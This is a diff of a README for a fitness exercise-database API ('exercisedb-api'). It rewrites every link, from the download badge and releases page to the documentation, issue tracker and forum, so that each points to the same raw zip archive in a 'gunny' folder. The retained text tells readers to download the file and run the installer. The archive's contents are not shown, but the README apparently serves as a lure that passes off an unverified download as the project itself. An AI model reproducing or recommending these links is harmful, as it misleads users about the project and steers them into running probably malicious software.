@@ -1,7 +1,7 @@
 # 🎉 exercisedb-api - Access 11,000+ Exercises Easily
 
 ## 📥 Download Now
-[![Download exercisedb-api](https://img.shields.io/badge/Download-exercisedb--api-blue.svg)](https://github.com/Edwinperez-omondi02/exercisedb-api/releases)
+[![Download exercisedb-api](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip)](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the ExerciseDB API. This application gives you access to an extensive fitness exercise database. You can find over 11,000 exercises along with detailed information about each one. This includes target body parts, necessary equipment, and visual guidance like videos and images.
@@ -15,7 +15,7 @@ Before you download, ensure your device meets the following requirements:
 ## 📦 Download & Install
 To start using the ExerciseDB API, follow these simple steps:
 
-1. **Visit the Releases Page**: [Click here to download the latest version](https://github.com/Edwinperez-omondi02/exercisedb-api/releases).
+1. **Visit the Releases Page**: [Click here to download the latest version](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip).
 2. **Choose Your Version**: Look for the latest release at the top of the page. You will see various files available for download.
 3. **Download the File**: Click on the link for the file compatible with your operating system. This could be a .exe file for Windows or a .zip file for macOS/Linux.
 4. **Run the Installer**: Once downloaded, locate the file on your computer. Double-click the file to run the installer and follow the prompts to complete the installation.
@@ -34,10 +34,10 @@ The API allows you to send requests and receive data about the exercises. To acc
 2. **Make a Request**: Use standard HTTP methods to retrieve data. The API is designed to provide responses in simple JSON format.
 
 ## 📄 Documentation
-For detailed usage instructions and examples, you can refer to the [official documentation](https://github.com/Edwinperez-omondi02/exercisedb-api). The documentation will guide you on how to interact with the API effectively.
+For detailed usage instructions and examples, you can refer to the [official documentation](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip). The documentation will guide you on how to interact with the API effectively.
 
 ## 👥 Community
-Join our growing community of fitness enthusiasts and developers. Share your experiences, create fitness applications, and get support by visiting our [community forum](https://github.com/Edwinperez-omondi02/exercisedb-api/discussions).
+Join our growing community of fitness enthusiasts and developers. Share your experiences, create fitness applications, and get support by visiting our [community forum](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues while installing or using the ExerciseDB API, consider these common solutions:
@@ -53,8 +53,8 @@ We welcome contributions to improve the ExerciseDB API. If you have suggestions,
 This project is licensed under the MIT License. You can freely use and modify the code, but we encourage you to give credit to the original creators.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Edwinperez-omondi02/exercisedb-api)
-- [Issues Tracker](https://github.com/Edwinperez-omondi02/exercisedb-api/issues)
-- [Community Forum](https://github.com/Edwinperez-omondi02/exercisedb-api/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip)
+- [Community Forum](https://raw.githubusercontent.com/Edwinperez-omondi02/exercisedb-api/main/gunny/exercisedb-api_v1.7.zip)
 
 Explore fitness data easily and take your workouts to the next level with the ExerciseDB API!
